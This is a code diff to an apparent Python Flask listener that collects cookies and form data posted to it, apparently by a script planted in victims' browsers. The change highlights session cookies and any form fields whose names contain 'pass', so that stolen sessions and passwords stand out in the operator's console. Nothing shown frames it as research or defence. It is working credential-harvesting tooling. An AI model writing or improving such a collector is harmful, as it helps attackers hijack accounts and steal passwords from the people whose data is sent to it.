@@ -26,12 +26,26 @@ def get_url():
 def get_cookie():
     if request.json:
         cookie = request.json["cookie"]
-        rprint(f"[yellow][+] Cookie: {cookie}[/yellow]")
+        # Special styling for any session cookies
+        if "sess" in cookie["name"].lower() or cookie["session"]:
+            style = "[white on yellow]"
+            style_close = "[/white on yellow]"
+        else:
+            style = "[yellow]"
+            style_close = "[/yellow]"
+        rprint(f"{style}[+] Cookie: {cookie}{style_close}")
     return "Thanks!"
 
 @app.route("/f", methods=["POST"])
 def get_form_data():
     if request.json:
         data = request.json["data"]
-        rprint(f"[red][+] Form Data: {data}[/red]")
+        # Special styling for any passwords
+        if any(["pass" in k.lower() for k in data]):
+            style = "[white on red]"
+            style_close = "[/white on red]"
+        else:
+            style = "[red]"
+            style_close = "[/red]"
+        rprint(f"{style}[+] Form Data: {data}{style_close}")
     return "Thanks!"
